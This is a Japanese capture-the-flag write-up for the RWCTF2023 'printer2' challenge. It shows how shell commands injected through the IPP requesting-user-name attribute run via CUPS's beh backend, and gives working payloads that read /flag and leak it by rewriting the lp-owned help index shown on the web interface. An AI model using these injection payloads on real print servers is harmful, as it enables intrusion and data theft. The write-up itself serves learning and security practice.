---
layout: page
title: "RWCTF2023 printer2"
date: 2023-01-08 00:00:00 -0000
---

プリンタのソフトウェアのpwnです。

Dockerfileはとてもシンプルでcupsを入れて終わりです。コンフィグも目立ったところはありません。

```
FROM ubuntu:22.04

RUN apt-get update && \
    apt-get install -qy cups 

COPY ./flag /flag
COPY ./cupsd.conf /etc/cups/cupsd.conf
COPY ./start.sh /start.sh

RUN chmod 755 /flag
RUN chmod 755 /start.sh

ENTRYPOINT ["/start.sh"]
```

また、私が触り始めたときにはすでにヒントが出ていました。

`hint: Take a look at my startup script!`

start.shは以下の通りです。

```
#!/bin/bash

sleep 10 && lpadmin -p rwctf -E -v beh:/1/3/5/socket://printer:9100 &
/usr/sbin/cupsd -f -C /etc/cups/cupsd.conf -s /etc/cups/cups-files.conf
```

この問題を見始めた時点で、cupsdの方は他の人がかなり調べているように見えたので、このヒントから `lpadmin`のコマンドを見ます。

[それっぽいwiki](https://wiki.linuxfoundation.org/openprinting/database/backenderrorhandler)が見つかりました。

`lpadmin`はプリンタを追加するコマンドです。接続先を指定しますが、先頭を`beh:`という書きだしにしておくことで、jobをためてエラーが出ても再開してくれるようになるそうです。

`beh:/1/3/5/socket://printer:9100` は例文にもあるレベルの書き方で、特に変わったところはありません。３回５秒空けてリトライする書き方とのことでした。

プリント方法について調べました。６３１番で待っているWebページからは、testページを印刷する機能がありましたが、それにならってPOSTしてみても、いい感じの引数が入りません。何とか普通に印刷したいです。

少し探していると、ipptoolを使ってやればよいという記載が見つかります。[公式](https://www.cups.org/doc/man-ipptool.html)では、`ipptool ipp://localhost/printers/myprinter get-completed-jobs.test` というフォーマットで送ってやると、いろいろできていそうです。wiresharkで見ると、IPPというプロトコルで通信しているのが分かります。ペイロードがPOSTなのですが、少し違っているようです。また`get-completed-jobs.test`でファイルを探すと、`/usr/share/cups/ipptool/`にたくさん見つかります。テストデータのようです。

print-job.testもありました。

```
# Print a test page using print-job
{
        # The name of the test...
        NAME "Print file using Print-Job"

        # The operation to use
        OPERATION Print-Job

        # Attributes, starting in the operation group...
        GROUP operation-attributes-tag
        ATTR charset attributes-charset utf-8
        ATTR language attributes-natural-language en
        ATTR uri printer-uri $uri
        ATTR name requesting-user-name $user
        ATTR mimeMediaType document-format $filetype

        GROUP job-attributes-tag
        ATTR integer copies 1

        FILE $filename

        # What statuses are OK?
        STATUS successful-ok
        STATUS successful-ok-ignored-or-substituted-attributes

        # What attributes do we expect?
        EXPECT job-id
        EXPECT job-uri
}
```

動作させると、behが起動しているようです。プリンタの実態がないので、jobはキャンセルしない限り残り続けます。

```
root           8  0.0  0.2  68592 16348 ?        S    08:24   0:09 /usr/sbin/cupsd -f -C /etc/cups/cupsd.conf -s /etc/cups/cups-files.conf
lp          3042  0.0  0.0   2772  1880 ?        S    13:40   0:00 beh:/1/3/5/socket://printer:9100 113 jt Untitled 1 job-uuid=urn:uuid:3982a81f-4d2b-3b5f-6a92-0dad14094500 job-originating-host-name=172.17.0.1 date-time-at-
lp          3043  0.0  0.0   2888  1004 ?        S    13:40   0:00 sh -c /usr/lib/cups/backend/socket '113' 'jt' 'Untitled' '1' 'job-uuid=urn:uuid:3982a81f-4d2b-3b5f-6a92-0dad14094500 job-originating-host-name=172.17.0.1 da
lp          3044  0.2  0.0  16892  7612 ?        S    13:40   0:00 /usr/lib/cups/backend/socket 113 jt Untitled 1 job-uuid=urn:uuid:3982a81f-4d2b-3b5f-6a92-0dad14094500 job-originating-host-name=172.17.0.1 date-time-at-crea
```

コマンドインジェクションの香りがします。`ATTR name requesting-user-name $user` を変えてみましょう。

`ATTR name requesting-user-name "';cat /flag > /tmp/a;'"`で撃ってみると、/tmp以下にファイルができています。刺さってしまいました。

```
# cat /tmp/a
rwctf{this is sample flag}
```

リバースシェルして終わりと思いましたが、lpの権限で動いているため、リバースどころかファイルの書き換えすらできません。lpが持っているファイルを探します。

`# find / -name cups -type d|xargs ls -la`でぼんやり眺めていたところ、`/var/cache/cups/help.index`というファイルがlpの所有物であることが分かります。`echo`で適当に書き換えても反映されます。

中身はWebページの`/help`以下に展開される見出しやテーブルの情報でした。何とかここに書き足して反映されないか、ほかの行を真似して書き足してみたところ、見出しなら追加されるようです。gzファイルになっているので、解凍して書き足して戻してあげます。

`ATTR name requesting-user-name "';cp /var/cache/cups/help.index /tmp/help.gz;gzip -d /tmp/help.gz; echo 'translation.html#aaaabbbb 114 514 \"'$$(cat /flag)'\"' >> /tmp/help; cp /tmp/help /tmp/bak; gzip /tmp/help; cp /tmp/help.gz /var/cache/cups/help.index;'"`

送ってみると、確かにページのどこかに追加されています。

```
$ ipptool -f ./start.sh ipp://172.17.0.2:631/printers/rwctf ./hoge
$ $ curl http://172.17.0.2:631/help/translation.html |grep aaaabbbb
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<P CLASS="l2"><A HREF="#aaaabbbb">rwctf{this is sample flag}</A></P>
<P CLASS="l2"><A HREF="#aaaabbbb">rwctf{this is sample flag}</A></P>
<P CLASS="l2"><A HREF="#aaaabbbb">rwctf{this is sample flag}</A></P>
100 30612    0 30612    0     0   550k      0 --:--:-- --:--:-- --:--:--  564k
```

本番サーバでやってみると、見出しのところにいました。

![](/assets/rw2023-printer2/flag.png)

久々に本番の締め切りに間に合いました。５solveだったので、１つ順位が上がりました。なんとかお役に立ててよかったです。
